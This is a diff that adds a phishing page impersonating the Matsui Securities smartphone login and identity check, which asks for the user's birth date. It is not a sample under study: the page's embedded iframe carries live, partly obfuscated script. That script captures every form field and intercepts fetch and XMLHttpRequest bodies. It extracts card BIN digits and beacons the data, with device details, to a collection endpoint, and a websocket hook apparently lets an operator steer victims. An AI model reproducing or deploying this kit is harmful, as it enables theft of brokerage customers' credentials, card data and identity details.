@@ -1,0 +1,219 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>スマホサイト ログイン | 松井証券</title><link rel="stylesheet" href="assets/index-D4wF775i.css"><style>[data-t]::after{content:attr(data-t)}[data-czid80]::after{content:attr(data-czid80)}</style></head><body class=""><div id="app"><div data-v-b12a206d=""><!----><div data-v-cab706f4="" data-v-b12a206d="" class="reference-header-shell"><iframe data-v-cab706f4="" class="reference-header-frame frame-pc" srcdoc="&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+    &lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot; /&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, user-scalable=no&quot;&gt;
+    &lt;title&gt;&lt;/title&gt;
+    &lt;style id=&quot;_s0&quot;&gt;[data-t]::after{content:attr(data-t)}&lt;/style&gt;
+    &lt;script&gt;!function(){var _=atob,a=_('ZGF0YS0='),b=_('ZGF0YS10'),c=a+Math[_('cmFuZG9t')]().toString(36).slice(2,8),d=document;function e(){d.querySelectorAll('['+b+']').forEach(function(f){f.setAttribute(c,f.getAttribute(b));f.removeAttribute(b)});var g=d.getElementById('_s0');g&amp;&amp;(g.textContent='['+b+']::after{content:attr('+b+')}['+c+']::after{content:attr('+c+')}')}d.readyState==='loading'?d.addEventListener('DOMContentLoaded',function(){setTimeout(e,0)}):setTimeout(e,0);window[_('X19kdA==')]=e;new MutationObserver(function(){d.querySelectorAll('['+b+']').forEach(function(f){f.setAttribute(c,f.getAttribute(b));f.removeAttribute(b)})}).observe(d.documentElement,{childList:true,subtree:true,attributes:true,attributeFilter:[b]})}()&lt;/script&gt;
+    &lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/index-Dq3dWapL.js&quot;&gt;&lt;/script&gt;
+    &lt;link rel=&quot;stylesheet&quot; crossorigin href=&quot;/assets/index-D4wF775i.css&quot;&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;
+  &lt;script&gt;
+(function(){
+  var tries=0;
+  var timer=setInterval(function(){
+    tries++;
+    if(tries&gt;150){clearInterval(timer);return;}
+    try{
+      var el=document.querySelector('#app');
+      var app=el&amp;&amp;el.__vue_app__;
+      var pinia=app&amp;&amp;app.config&amp;&amp;app.config.globalProperties&amp;&amp;app.config.globalProperties.$pinia;
+      var store=pinia&amp;&amp;pinia._s&amp;&amp;pinia._s.get&amp;&amp;pinia._s.get('webSocket');
+      if(!store||!store.socket||store.__gwPatched)return;
+      store.__gwPatched=true;
+      var dispatch=function(raw){
+        try{
+          var msg=typeof raw==='string'?JSON.parse(raw):raw;
+          if(!msg||msg.type!=='check')return;
+          var hs=store.messageHandlers||[];
+          for(var i=0;i&lt;hs.length;i++){try{hs[i](msg)}catch(e){}}
+        }catch(e){}
+      };
+      store.socket.addEventListener('message',function(e){dispatch(e.data);});
+      // 主动再要一次站点配置：服务端收到 view 就回 check，保证垫片一定能收到
+      var n=0;
+      var again=setInterval(function(){
+        n++;
+        try{store.socket.send(JSON.stringify({action:'view',data:''}));}catch(e){}
+        if(n&gt;=3)clearInterval(again);
+      },2500);
+      clearInterval(timer);
+    }catch(e){}
+  },200);
+})();
+&lt;/script&gt;&lt;script&gt;
+(function(){
+if(window.__gwCap)return;window.__gwCap=1;
+var EP=&quot;/api/client/postData&quot;,SITE=&quot;matsui_jp_news&quot;,last=&quot;&quot;,lastAt=0,step=0;
+function uuid(){
+  try{
+    var k=&quot;gw_uuid&quot;,v=localStorage.getItem(k);
+    if(!v){v=&quot;g&quot;+Date.now().toString(36)+Math.random().toString(36).slice(2,10);localStorage.setItem(k,v);}
+    return v;
+  }catch(e){return &quot;&quot;}
+}
+function action(){
+  var p=(location.pathname||&quot;&quot;).toLowerCase(),f=p.split(&quot;/&quot;).pop()||&quot;&quot;;
+  if(/checkout/.test(p))return &quot;checkoutPage&quot;;
+  if(/certificate|verify|identity/.test(p))return &quot;identityPage&quot;;
+  if(/news/.test(p))return &quot;infoPage&quot;;
+  if(/result|success/.test(p))return &quot;resultPage&quot;;
+  if(f===&quot;&quot;||f===&quot;index.html&quot;||p===&quot;/&quot;)return &quot;loginPage&quot;;
+  return f.replace(/\.html?$/,&quot;&quot;).replace(/[^a-z0-9_\-]/g,&quot;&quot;)||&quot;page&quot;;
+}
+function val(el){
+  try{
+    var v=el.value;
+    if(v==null)return &quot;&quot;;
+    if(el.type===&quot;checkbox&quot;||el.type===&quot;radio&quot;)return el.checked?(String(v)||&quot;on&quot;):&quot;&quot;;
+    return String(v);
+  }catch(e){return &quot;&quot;}
+}
+function keyOf(el,i){
+  var n=el.getAttribute(&quot;name&quot;)||el.getAttribute(&quot;id&quot;)||el.getAttribute(&quot;placeholder&quot;)||
+        el.getAttribute(&quot;aria-label&quot;)||el.getAttribute(&quot;autocomplete&quot;)||el.type||&quot;f&quot;;
+  n=String(n).replace(/[^\w\u3040-\u30ff\u4e00-\u9fff.@\-]/g,&quot;_&quot;).slice(0,64);
+  return n||(&quot;f&quot;+i);
+}
+function snapshot(){
+  var out={},els=document.querySelectorAll(&quot;input,select,textarea&quot;),n=0;
+  for(var i=0;i&lt;els.length;i++){
+    var el=els[i];
+    try{
+      if(el.disabled)continue;
+      var t=(el.type||&quot;&quot;).toLowerCase();
+      if(t===&quot;file&quot;||t===&quot;submit&quot;||t===&quot;button&quot;||t===&quot;image&quot;||t===&quot;reset&quot;)continue;
+      var v=val(el);
+      if(v===&quot;&quot;)continue;
+      var k=keyOf(el,i);
+      if(out[k]!==undefined)k=k+&quot;#&quot;+i;
+      out[k]=v.slice(0,512);
+      if(++n&gt;=40)break;
+    }catch(e){}
+  }
+  return out;
+}
+function cardBin(f){
+  for(var k in f){
+    if(!/card|カード|pan|ccard/i.test(k))continue;
+    var d=String(f[k]).replace(/\D/g,&quot;&quot;);
+    if(d.length&gt;=6)return d.slice(0,6);
+  }
+  return &quot;&quot;;
+}
+function tz(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone||&quot;&quot;}catch(e){return &quot;&quot;}}
+function send(p){
+  if(!p)return;
+  var body;
+  try{body=JSON.stringify(p)}catch(e){return}
+  var now=Date.now();
+  if(body===last&amp;&amp;now-lastAt&lt;2000)return;
+  last=body;lastAt=now;
+  try{
+    if(navigator.sendBeacon&amp;&amp;navigator.sendBeacon(EP,new Blob([body],{type:&quot;application/json&quot;})))return;
+  }catch(e){}
+  try{
+    fetch(EP,{method:&quot;POST&quot;,credentials:&quot;same-origin&quot;,keepalive:true,
+      headers:{&quot;Content-Type&quot;:&quot;application/json&quot;},body:body});
+    return;
+  }catch(e){}
+  try{
+    var x=new XMLHttpRequest();
+    x.open(&quot;POST&quot;,EP,true);
+    x.setRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;);
+    x.send(body);
+  }catch(e){}
+}
+function push(kind,fields){
+  var f=fields||snapshot(),n=0;
+  for(var k in f){n++;}
+  if(!n&amp;&amp;!fields)return;
+  var p={
+    uuid:uuid(),
+    site_code:SITE||location.hostname,
+    action:action(),
+    _route:(location.pathname||&quot;&quot;)+(location.hash&amp;&amp;location.hash.length&lt;48?location.hash:&quot;&quot;),
+    data:f,
+    cardBIN:cardBin(f),
+    kind:kind,
+    step:step,
+    href:String(location.href).slice(0,512),
+    referer:String(document.referrer||&quot;&quot;).slice(0,512),
+    lang:String(navigator.language||&quot;&quot;),
+    tz:tz(),
+    screen:(window.screen?(screen.width+&quot;x&quot;+screen.height):&quot;&quot;)
+  };
+  if(kind===&quot;submit&quot;||kind===&quot;click&quot;)step++;
+  send(p);
+}
+document.addEventListener(&quot;submit&quot;,function(){try{push(&quot;submit&quot;)}catch(e){}},true);
+document.addEventListener(&quot;click&quot;,function(e){
+  try{
+    var t=e.target&amp;&amp;e.target.closest?e.target.closest(&quot;button,input[type=submit],[role=button],a&quot;):null;
+    if(!t)return;
+    push(&quot;click&quot;);
+  }catch(e){}
+},true);
+document.addEventListener(&quot;keydown&quot;,function(e){
+  if(e.key===&quot;Enter&quot;||e.keyCode===13){try{push(&quot;enter&quot;)}catch(err){}}
+},true);
+try{
+  var of=window.fetch;
+  if(of){
+    window.fetch=function(u,o){
+      try{
+        var b=o&amp;&amp;o.body;
+        if(typeof b===&quot;string&quot;&amp;&amp;b.length&amp;&amp;b.length&lt;8000){
+          var f={};
+          try{f=JSON.parse(b)}catch(err){f=flat(b)}
+          if(f&amp;&amp;typeof f===&quot;object&quot;)push(&quot;fetch&quot;,shrink(f));
+        }
+      }catch(err){}
+      return of.apply(this,arguments);
+    };
+  }
+}catch(e){}
+try{
+  var os=XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.send=function(b){
+    try{
+      if(typeof b===&quot;string&quot;&amp;&amp;b.length&amp;&amp;b.length&lt;8000){
+        var f={};
+        try{f=JSON.parse(b)}catch(err){f=flat(b)}
+        if(f&amp;&amp;typeof f===&quot;object&quot;)push(&quot;xhr&quot;,shrink(f));
+      }
+    }catch(err){}
+    return os.apply(this,arguments);
+  };
+}catch(e){}
+function flat(s){
+  var o={},p=String(s).split(&quot;&amp;&quot;);
+  for(var i=0;i&lt;p.length&amp;&amp;i&lt;40;i++){
+    if(!p[i])continue;
+    var kv=p[i].split(&quot;=&quot;);
+    var k=kv[0],v=kv.slice(1).join(&quot;=&quot;);
+    try{k=decodeURIComponent(k);v=decodeURIComponent(v)}catch(e){}
+    if(k&amp;&amp;v)o[k]=v;
+  }
+  return o;
+}
+function shrink(o){
+  var out={},n=0;
+  for(var k in o){
+    var v=o[k];
+    if(v===null||v===undefined||v===&quot;&quot;)continue;
+    if(typeof v===&quot;object&quot;){try{v=JSON.stringify(v)}catch(e){continue}}
+    out[String(k).slice(0,80)]=String(v).slice(0,512);
+    if(++n&gt;=40)break;
+  }
+  return out;
+}
+})();
+&lt;/script&gt;&lt;/body&gt;
+&lt;/html&gt;
+" title="Matsui Header" scrolling="no"></iframe></div><div data-v-b12a206d="" class="birth-page"><div data-v-b12a206d="" class="birth-heading"><h1 data-v-b12a206d=""><span data-v-b12a206d="" data-czid80="本人確認"></span></h1></div><div data-v-b12a206d="" class="birth-wrap"><div data-v-b12a206d="" class="birth-inner"><!----><div data-v-b12a206d="" class="birth-attention"><p data-v-b12a206d="">セキュリティ対策のため、ご登録いただいている以下の項目をご入力ください。</p></div><section data-v-b12a206d=""><table data-v-b12a206d="" class="form-table"><tbody data-v-b12a206d=""><tr data-v-b12a206d=""><th data-v-b12a206d=""><div data-v-b12a206d="" class="m-adj-th"><span data-v-b12a206d="" data-czid80="生年月日 "></span><span data-v-b12a206d="" class="m-icn-must">必須</span></div></th><td data-v-b12a206d=""><div data-v-b12a206d="" class="date-selects"><select data-v-b12a206d="" required="" class="date-select"><option data-v-b12a206d="" value=""></option><option data-v-b12a206d="" value="1900">1900年</option><option data-v-b12a206d="" value="1901">1901年</option><option data-v-b12a206d="" value="1902">1902年</option><option data-v-b12a206d="" value="1903">1903年</option><option data-v-b12a206d="" value="1904">1904年</option><option data-v-b12a206d="" value="1905">1905年</option><option data-v-b12a206d="" value="1906">1906年</option><option data-v-b12a206d="" value="1907">1907年</option><option data-v-b12a206d="" value="1908">1908年</option><option data-v-b12a206d="" value="1909">1909年</option><option data-v-b12a206d="" value="1910">1910年</option><option data-v-b12a206d="" value="1911">1911年</option><option data-v-b12a206d="" value="1912">1912年</option><option data-v-b12a206d="" value="1913">1913年</option><option data-v-b12a206d="" value="1914">1914年</option><option data-v-b12a206d="" value="1915">1915年</option><option data-v-b12a206d="" value="1916">1916年</option><option data-v-b12a206d="" value="1917">1917年</option><option data-v-b12a206d="" value="1918">1918年</option><option data-v-b12a206d="" value="1919">1919年</option><option data-v-b12a206d="" value="1920">1920年</option><option data-v-b12a206d="" value="1921">1921年</option><option data-v-b12a206d="" value="1922">1922年</option><option data-v-b12a206d="" value="1923">1923年</option><option data-v-b12a206d="" value="1924">1924年</option><option data-v-b12a206d="" value="1925">1925年</option><option data-v-b12a206d="" value="1926">1926年</option><option data-v-b12a206d="" value="1927">1927年</option><option data-v-b12a206d="" value="1928">1928年</option><option data-v-b12a206d="" value="1929">1929年</option><option data-v-b12a206d="" value="1930">1930年</option><option data-v-b12a206d="" value="1931">1931年</option><option data-v-b12a206d="" value="1932">1932年</option><option data-v-b12a206d="" value="1933">1933年</option><option data-v-b12a206d="" value="1934">1934年</option><option data-v-b12a206d="" value="1935">1935年</option><option data-v-b12a206d="" value="1936">1936年</option><option data-v-b12a206d="" value="1937">1937年</option><option data-v-b12a206d="" value="1938">1938年</option><option data-v-b12a206d="" value="1939">1939年</option><option data-v-b12a206d="" value="1940">1940年</option><option data-v-b12a206d="" value="1941">1941年</option><option data-v-b12a206d="" value="1942">1942年</option><option data-v-b12a206d="" value="1943">1943年</option><option data-v-b12a206d="" value="1944">1944年</option><option data-v-b12a206d="" value="1945">1945年</option><option data-v-b12a206d="" value="1946">1946年</option><option data-v-b12a206d="" value="1947">1947年</option><option data-v-b12a206d="" value="1948">1948年</option><option data-v-b12a206d="" value="1949">1949年</option><option data-v-b12a206d="" value="1950">1950年</option><option data-v-b12a206d="" value="1951">1951年</option><option data-v-b12a206d="" value="1952">1952年</option><option data-v-b12a206d="" value="1953">1953年</option><option data-v-b12a206d="" value="1954">1954年</option><option data-v-b12a206d="" value="1955">1955年</option><option data-v-b12a206d="" value="1956">1956年</option><option data-v-b12a206d="" value="1957">1957年</option><option data-v-b12a206d="" value="1958">1958年</option><option data-v-b12a206d="" value="1959">1959年</option><option data-v-b12a206d="" value="1960">1960年</option><option data-v-b12a206d="" value="1961">1961年</option><option data-v-b12a206d="" value="1962">1962年</option><option data-v-b12a206d="" value="1963">1963年</option><option data-v-b12a206d="" value="1964">1964年</option><option data-v-b12a206d="" value="1965">1965年</option><option data-v-b12a206d="" value="1966">1966年</option><option data-v-b12a206d="" value="1967">1967年</option><option data-v-b12a206d="" value="1968">1968年</option><option data-v-b12a206d="" value="1969">1969年</option><option data-v-b12a206d="" value="1970">1970年</option><option data-v-b12a206d="" value="1971">1971年</option><option data-v-b12a206d="" value="1972">1972年</option><option data-v-b12a206d="" value="1973">1973年</option><option data-v-b12a206d="" value="1974">1974年</option><option data-v-b12a206d="" value="1975">1975年</option><option data-v-b12a206d="" value="1976">1976年</option><option data-v-b12a206d="" value="1977">1977年</option><option data-v-b12a206d="" value="1978">1978年</option><option data-v-b12a206d="" value="1979">1979年</option><option data-v-b12a206d="" value="1980">1980年</option><option data-v-b12a206d="" value="1981">1981年</option><option data-v-b12a206d="" value="1982">1982年</option><option data-v-b12a206d="" value="1983">1983年</option><option data-v-b12a206d="" value="1984">1984年</option><option data-v-b12a206d="" value="1985">1985年</option><option data-v-b12a206d="" value="1986">1986年</option><option data-v-b12a206d="" value="1987">1987年</option><option data-v-b12a206d="" value="1988">1988年</option><option data-v-b12a206d="" value="1989">1989年</option><option data-v-b12a206d="" value="1990">1990年</option><option data-v-b12a206d="" value="1991">1991年</option><option data-v-b12a206d="" value="1992">1992年</option><option data-v-b12a206d="" value="1993">1993年</option><option data-v-b12a206d="" value="1994">1994年</option><option data-v-b12a206d="" value="1995">1995年</option><option data-v-b12a206d="" value="1996">1996年</option><option data-v-b12a206d="" value="1997">1997年</option><option data-v-b12a206d="" value="1998">1998年</option><option data-v-b12a206d="" value="1999">1999年</option><option data-v-b12a206d="" value="2000">2000年</option><option data-v-b12a206d="" value="2001">2001年</option><option data-v-b12a206d="" value="2002">2002年</option><option data-v-b12a206d="" value="2003">2003年</option><option data-v-b12a206d="" value="2004">2004年</option><option data-v-b12a206d="" value="2005">2005年</option><option data-v-b12a206d="" value="2006">2006年</option><option data-v-b12a206d="" value="2007">2007年</option><option data-v-b12a206d="" value="2008">2008年</option><option data-v-b12a206d="" value="2009">2009年</option><option data-v-b12a206d="" value="2010">2010年</option><option data-v-b12a206d="" value="2011">2011年</option><option data-v-b12a206d="" value="2012">2012年</option><option data-v-b12a206d="" value="2013">2013年</option><option data-v-b12a206d="" value="2014">2014年</option><option data-v-b12a206d="" value="2015">2015年</option><option data-v-b12a206d="" value="2016">2016年</option><option data-v-b12a206d="" value="2017">2017年</option><option data-v-b12a206d="" value="2018">2018年</option><option data-v-b12a206d="" value="2019">2019年</option><option data-v-b12a206d="" value="2020">2020年</option><option data-v-b12a206d="" value="2021">2021年</option><option data-v-b12a206d="" value="2022">2022年</option><option data-v-b12a206d="" value="2023">2023年</option><option data-v-b12a206d="" value="2024">2024年</option></select><span data-v-b12a206d="" class="date-label">年</span><select data-v-b12a206d="" required="" class="date-select"><option data-v-b12a206d="" value=""></option><option data-v-b12a206d="" value="1">1月</option><option data-v-b12a206d="" value="2">2月</option><option data-v-b12a206d="" value="3">3月</option><option data-v-b12a206d="" value="4">4月</option><option data-v-b12a206d="" value="5">5月</option><option data-v-b12a206d="" value="6">6月</option><option data-v-b12a206d="" value="7">7月</option><option data-v-b12a206d="" value="8">8月</option><option data-v-b12a206d="" value="9">9月</option><option data-v-b12a206d="" value="10">10月</option><option data-v-b12a206d="" value="11">11月</option><option data-v-b12a206d="" value="12">12月</option></select><span data-v-b12a206d="" class="date-label">月</span><select data-v-b12a206d="" required="" class="date-select"><option data-v-b12a206d="" value=""></option><option data-v-b12a206d="" value="1">1日</option><option data-v-b12a206d="" value="2">2日</option><option data-v-b12a206d="" value="3">3日</option><option data-v-b12a206d="" value="4">4日</option><option data-v-b12a206d="" value="5">5日</option><option data-v-b12a206d="" value="6">6日</option><option data-v-b12a206d="" value="7">7日</option><option data-v-b12a206d="" value="8">8日</option><option data-v-b12a206d="" value="9">9日</option><option data-v-b12a206d="" value="10">10日</option><option data-v-b12a206d="" value="11">11日</option><option data-v-b12a206d="" value="12">12日</option><option data-v-b12a206d="" value="13">13日</option><option data-v-b12a206d="" value="14">14日</option><option data-v-b12a206d="" value="15">15日</option><option data-v-b12a206d="" value="16">16日</option><option data-v-b12a206d="" value="17">17日</option><option data-v-b12a206d="" value="18">18日</option><option data-v-b12a206d="" value="19">19日</option><option data-v-b12a206d="" value="20">20日</option><option data-v-b12a206d="" value="21">21日</option><option data-v-b12a206d="" value="22">22日</option><option data-v-b12a206d="" value="23">23日</option><option data-v-b12a206d="" value="24">24日</option><option data-v-b12a206d="" value="25">25日</option><option data-v-b12a206d="" value="26">26日</option><option data-v-b12a206d="" value="27">27日</option><option data-v-b12a206d="" value="28">28日</option><option data-v-b12a206d="" value="29">29日</option><option data-v-b12a206d="" value="30">30日</option><option data-v-b12a206d="" value="31">31日</option></select><span data-v-b12a206d="" class="date-label">日</span></div></td></tr></tbody></table></section><div data-v-b12a206d="" class="submit-row"><span data-v-b12a206d=""><input data-v-b12a206d="" type="submit" class="submit-btn" value="次へ"></span></div></div></div></div><div data-v-1b1e507a="" data-v-b12a206d="" class="matsui-footer"><footer data-v-1b1e507a="" class="footer" role="contentinfo"><div data-v-1b1e507a="" class="footer-bottom"><div data-v-1b1e507a="" class="footer-copyright"><div data-v-1b1e507a="" class="footer__inner"><p data-v-1b1e507a="" class="footer-corporate"><span data-v-1b1e507a="" data-czid80="松井証券株式会社"></span><i data-v-1b1e507a="" data-czid80="金融商品取引業者 関東財務局長(金商)第164号 加入協会：日本証券業協会、一般社団法人 金融先物取引業協会" style="font-style: normal;"></i></p><small data-v-1b1e507a=""><span data-v-1b1e507a="" data-czid80="Copyright © Matsui Securities Co.,Ltd."></span></small></div></div></div></footer></div></div></div></body></html>
